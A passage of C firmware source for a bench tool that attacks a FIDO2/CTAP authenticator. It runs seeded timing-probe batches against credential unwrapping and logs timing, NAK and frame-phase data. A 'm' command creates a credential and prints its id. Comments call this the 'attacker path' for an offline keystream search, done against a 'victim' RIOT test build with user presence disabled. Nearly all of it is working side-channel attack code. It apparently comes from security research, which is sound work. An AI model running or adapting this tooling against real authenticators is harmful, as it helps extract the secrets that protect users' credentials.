                    if (g_recover_mode == 2u && ++qstreak < 2u) continue;
                    if (ctaphid_abort() == XR_OK) continue;
                    g_cid = 0;
                    if (ctaphid_init() != XR_OK) {
                        g_ep_out = 0; g_ep_in = 0; g_cid = 0;
                        if (ensure_ready() != XR_OK || ctaphid_init() != XR_OK) {
                            uputs("# unrecoverable"); nl(); break;
                        }
                    }
                    continue;
                }
                qstreak = 0;
                putdec(t); uputc(' '); putdec(naks); uputc(' ');
                for (uint32_t i = 0; i < 12u; i++) puthexb(g_fixnonce[i]);
                nl();
            }
            g_fixnonce_on = 0u;
            uputs("END"); nl();
            break; }
        case 'T': {     /* T <seed hex> <entries> <count> : one record per line,
                         * "<ticks> <naks> <ftrem> <status>", then END. */
            uint32_t seed = 0, n = 0, count = 0; int d;
            while (*p == ' ') p++;
            while ((d = (*p >= '0' && *p <= '9') ? *p - '0' :
                        (*p >= 'a' && *p <= 'f') ? *p - 'a' + 10 :
                        (*p >= 'A' && *p <= 'F') ? *p - 'A' + 10 : -1) >= 0)
                { seed = (seed << 4) | (uint32_t)d; p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { n = n*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { count = count*10 + (uint32_t)(*p - '0'); p++; }
            if (!n || n > 20u) n = 1u;
            if (!count) count = 100u;
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            if (!g_cid && ctaphid_init() != XR_OK) { uputs("  no cid"); nl(); break; }
            prng = seed ? seed : 1u;
            uint32_t streak = 0;
            for (uint32_t k = 0; k < count; k++) {
                /* The inter-probe gap, and NOT before the first probe: k == 0 already
                 * follows the console round trip, so gapping it too would make the
                 * zero-gap arm differ from every capture taken so far. */
                if (k) hold_us(g_probe_gap_us);
                uint32_t t = 0, naks = 0, ft = 0; uint8_t st = 0;
                /* Each probe re-seeds from the running PRNG so the host can
                 * mirror the whole stream from one seed. */
                uint32_t s = prng;
                int r = probe_once(n, s, &t, &naks, &st, &ft);
                if (r != XR_OK || st != 0x2Eu) {
                    /* Recover and carry on rather than abandoning the batch: a
                     * wedged channel costs one trace, not the campaign. */
                    uputs("# err "); putdec((uint32_t)r); uputs(" st=0x"); puthexb(st);
                    uputs(" at "); putdec(k); uputs(" ftrem="); putdec(ft); nl();
                    /* Escalating recovery: re-INIT, and if the channel will not
                     * come back, re-enumerate the device entirely.  A batch that
                     * abandons itself on the first wedge cannot produce a
                     * distribution, and a distribution is the whole point.
                     *
                     * ...but recovery is not free: at ~30 % faults it costs about
                     * 1.8 s each and holds the batch to ~2 probes/s against a
                     * 10 ms probe, so `A 1` asks whether it is needed at all.
                     * The evidence that it was -- a probe after a fault hanging
                     * until the channel was re-INITed -- came from runs driving
                     * one console command per probe, and that hang is now known to
                     * be a DROPPED COMMAND (the console is polled and was still
                     * printing).  So the recovery may be paying for a bug that was
                     * never on the device. */
                    /* Mode 1 skips recovery entirely, which is 9x faster on
                     * ISOLATED faults and a disaster on a real wedge: with nothing
                     * to bring the channel back, every later probe faults too and
                     * a sweep stalls until its budget runs out.  Measured, by
                     * losing a run to it.  Mode 2 is the useful middle: pay for
                     * recovery only once a SECOND fault in a row says the channel
                     * really is gone. */
                    if (g_recover_mode == 1u) continue;
                    if (g_recover_mode == 2u && ++streak < 2u) continue;
                    if (ctaphid_abort() == XR_OK) continue;
                    g_cid = 0;
                    if (ctaphid_init() != XR_OK) {
                        g_ep_out = 0; g_ep_in = 0; g_cid = 0;
                        if (ensure_ready() != XR_OK || ctaphid_init() != XR_OK) {
                            uputs("# unrecoverable"); nl(); uputs("END"); nl(); break;
                        }
                    }
                    continue;
                }
                streak = 0;
                putdec(t); uputc(' '); putdec(naks); uputc(' ');
                putdec(ft); uputc(' '); puthexb(st); nl();
            }
            uputs("END"); nl();
            break; }
        case 'f': {     /* f <lo> <hi> : start each `T` probe with HFNUM's FRREM in
                         * [lo,hi). `f 0 0` disables. See await_phase(). */
            uint32_t lo = 0, hi = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { lo = lo*10 + (uint32_t)(*p - '0'); p++; }
            while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { hi = hi*10 + (uint32_t)(*p - '0'); p++; }
            g_phase_lo = lo; g_phase_hi = hi;
            uputs("  phase window ["); putdec(g_phase_lo); uputs(",");
            putdec(g_phase_hi); uputs(") ");
            uputs(g_phase_hi > g_phase_lo ? "on" : "off"); nl();
            break; }
        case 'g': {     /* g <us> : idle this long between consecutive probes in a `T`
                         * batch. See g_probe_gap_us for what it tests. */
            uint32_t us = 0; while (*p == ' ') p++;
            while (*p >= '0' && *p <= '9') { us = us*10 + (uint32_t)(*p - '0'); p++; }
            g_probe_gap_us = us;
            uputs("  probe gap="); putdec(g_probe_gap_us); uputs(" us"); nl();
            break; }
        case 'm': {     /* m : authenticatorMakeCredential, then print the credential id.
                         * This closes the last gap in the attacker path. The offline
                         * search needs one keystream block, and an attacker obtains it
                         * from a CAPTURED credential id:
                         *
                         *   keystream_block_1 = credId[0:16] ^ plaintext[0:16]
                         *
                         * where the first 32 plaintext bytes are the rp_id_hash of an
                         * rp_id the attacker chose (`_ctap_encrypt_rk` wraps a
                         * ctap_resident_key whose first field is rp_id_hash[32]).
                         * Without this command the oracle had to be computed on the
                         * bench from the key, which is a shortcut in ACQUISITION rather
                         * than in the attack, and had to be labelled as one.
                         *
                         * The victim's build (RIOT tests/sys/fido2_ctap) sets
                         * CONFIG_FIDO2_CTAP_DISABLE_UP=1, so no button press is needed.
                         * Against a build without it this blocks for the user-presence
                         * timeout instead, which reads as a plain timeout here. */
            static const char RPID[] = "example.com";
            if (ensure_ready() != XR_OK) { uputs("  not ready"); nl(); break; }
            if (!g_cid && ctaphid_init() != XR_OK) { uputs("  no cid"); nl(); break; }
            uint32_t o = 0;
            g_req[o++] = 0x01u;                     /* authenticatorMakeCredential */
            g_req[o++] = 0xA4u;                     /* map(4) */
            /* All four of clientDataHash, rp, user and pubKeyCredParams are required:
             * ctap_cbor.c rejects the request unless required_parsed == 4. And within
             * each map the keys must be in CANONICAL order -- by encoded LENGTH first,
             * then bytewise -- because RIOT runs cbor_value_validate() before reading
             * any field, so "id" precedes "name" and "alg" precedes "type". */
            g_req[o++] = 0x01u; g_req[o++] = 0x58u; g_req[o++] = 0x20u;
            for (uint32_t i = 0; i < 32u; i++) g_req[o++] = prng_byte();
            g_req[o++] = 0x02u; g_req[o++] = 0xA2u;                 /* rp */
            g_req[o++] = 0x62u; g_req[o++] = 'i'; g_req[o++] = 'd';
            g_req[o++] = (uint8_t)(0x60u | (sizeof RPID - 1u));
            for (uint32_t i = 0; i < sizeof RPID - 1u; i++) g_req[o++] = (uint8_t)RPID[i];
            g_req[o++] = 0x64u; g_req[o++] = 'n'; g_req[o++] = 'a';
            g_req[o++] = 'm'; g_req[o++] = 'e';
            g_req[o++] = 0x67u; g_req[o++] = 'e'; g_req[o++] = 'x'; g_req[o++] = 'a';
            g_req[o++] = 'm'; g_req[o++] = 'p'; g_req[o++] = 'l'; g_req[o++] = 'e';
            g_req[o++] = 0x03u; g_req[o++] = 0xA2u;                 /* user */
            g_req[o++] = 0x62u; g_req[o++] = 'i'; g_req[o++] = 'd';
            g_req[o++] = 0x41u; g_req[o++] = 0x01u;                 /* bytes(1) */
            g_req[o++] = 0x64u; g_req[o++] = 'n'; g_req[o++] = 'a';
            g_req[o++] = 'm'; g_req[o++] = 'e';
            g_req[o++] = 0x64u; g_req[o++] = 'u'; g_req[o++] = 's';
            g_req[o++] = 'e'; g_req[o++] = 'r';
            g_req[o++] = 0x04u; g_req[o++] = 0x81u; g_req[o++] = 0xA2u;
            g_req[o++] = 0x63u; g_req[o++] = 'a'; g_req[o++] = 'l'; g_req[o++] = 'g';
            g_req[o++] = 0x26u;                                     /* -7, ES256 */
            g_req[o++] = 0x64u; g_req[o++] = 't'; g_req[o++] = 'y';
            g_req[o++] = 'p'; g_req[o++] = 'e';
            g_req[o++] = 0x6Au;
            { const char *t = "public-key";
              for (uint32_t i = 0; i < 10u; i++) g_req[o++] = (uint8_t)t[i]; }
            g_req_len = o;

            int r = ctaphid_send(g_cid, 0x90u, g_req, g_req_len);   /* CTAPHID_CBOR */
            if (r != XR_OK) { uputs("  send "); uputs(xr_name(r)); nl(); break; }
            uint8_t cmd2 = 0; uint32_t len2 = 0, naks2 = 0, ka2 = 0;
            /* ECDSA keygen plus a signature: the first campaign measured 182 ms for the
             * attestation path, so this needs a far longer timeout than a failing
             * unwrap does. */
            r = recv_message(&cmd2, g_rep, sizeof g_rep, &len2, 3000000u, &naks2, &ka2);
            if (r != XR_OK) { uputs("  recv "); uputs(xr_name(r)); nl(); break; }
            uputs("  status=0x"); puthexb(len2 ? g_rep[0] : 0xFFu);
            uputs(" len="); putdec(len2); uputs(" ka="); putdec(ka2); nl();
            if (!len2 || g_rep[0] != 0x00u) { uputs("  refused"); nl(); break; }

            /* Walk the response map to authData, then index into it. The layout is
             * fixed by WebAuthn: rpIdHash(32) flags(1) signCount(4) aaguid(16)
             * credIdLen(2, big endian) credId. Nothing here is guessed from a length --
             * if the shape is not what is expected it says so and prints the raw bytes,
             * because a silently mis-parsed credential id would poison the oracle. */
            uint32_t i2 = 1u;                       /* past the status byte */
            int ok = (i2 < len2 && (g_rep[i2] & 0xE0u) == 0xA0u);
            if (ok) i2++;                           /* map header */
            if (ok && i2 < len2 && g_rep[i2] == 0x01u) {
                i2++;                               /* key 1: fmt */
                if ((g_rep[i2] & 0xE0u) == 0x60u) { i2 += 1u + (g_rep[i2] & 0x1Fu); }
                else ok = 0;
            } else ok = 0;
            uint32_t ad = 0, adlen = 0;
            if (ok && i2 < len2 && g_rep[i2] == 0x02u) {
                i2++;                               /* key 2: authData, a byte string */
                if (g_rep[i2] == 0x58u)      { adlen = g_rep[i2+1]; ad = i2 + 2u; }
                else if (g_rep[i2] == 0x59u) { adlen = ((uint32_t)g_rep[i2+1] << 8)
                                                       | g_rep[i2+2]; ad = i2 + 3u; }
                else if ((g_rep[i2] & 0xE0u) == 0x40u) { adlen = g_rep[i2] & 0x1Fu;
                                                         ad = i2 + 1u; }
                else ok = 0;
            } else ok = 0;
            if (!ok || ad + 55u > len2) {
                uputs("  unexpected response shape; raw:"); nl(); uputs("  ");
                for (uint32_t i = 0; i < len2 && i < 96u; i++) puthexb(g_rep[i]);
                nl(); break;
            }
            uint32_t cl = ((uint32_t)g_rep[ad + 53u] << 8) | g_rep[ad + 54u];
            uputs("  authData="); putdec(adlen);
            uputs(" credIdLen="); putdec(cl); nl();
            if (cl == 0u || ad + 55u + cl > len2) {
                uputs("  credential id does not fit the response"); nl(); break;
            }
            uputs("  credid=");
            for (uint32_t i = 0; i < cl; i++) puthexb(g_rep[ad + 55u + i]);
            nl();
            uputs("  rpid="); uputs(RPID); nl();
            break; }
        default: uputs("?"); nl(); break;
        }
    }
}
